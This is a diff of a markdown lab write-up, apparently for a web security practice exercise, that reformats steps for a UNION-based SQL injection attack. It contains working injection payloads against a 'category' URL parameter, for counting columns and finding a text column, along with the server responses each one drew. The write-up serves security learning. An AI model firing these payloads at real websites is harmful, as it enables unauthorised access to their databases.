@@ -14,19 +14,22 @@ date: 2023-04-25
 
 ## Exp
 1. Determine how many columns it has
-You can use the technique from previous question.
-Payload: `?category=' UNION SELECT NULL,NULL,NULL--`
+    
+    You can use the technique from previous question.
+    
+    Payload: `?category=' UNION SELECT NULL,NULL,NULL--`
 2. Start to guess which column contains text
-For example: 
-`?category=Accessories' UNION (SELECT 'a', NULL, NULL)--` $\to$ Internal Server Error
-`?category=Accessories' UNION (SELECT NULL, 'a', NULL)--` $\to$ <font color="FF0000">No Error</font>
-`?category=Accessories' UNION (SELECT NULL, NULL, 'a')--` $\to$ Internal Server Error
+    
+    For example: 
+    
+    `?category=Accessories' UNION (SELECT 'a', NULL, NULL)--` → Internal Server Error
+    
+    `?category=Accessories' UNION (SELECT NULL, 'a', NULL)--` → <font color="FF0000">No Error</font>
+    
+    `?category=Accessories' UNION (SELECT NULL, NULL, 'a')--` → Internal Server Error
 
     **Then we can consider which column is text-based string**
 
     Payload: `?category=Accessories' UNION (SELECT NULL, 'DoimDt', NULL)--`
-    :::spoiler Success Screenshot
-    ![](https://imgur.com/LtSoc2E.png)
-    :::
-
-## Reference
+    
+![](https://imgur.com/LtSoc2E.png)
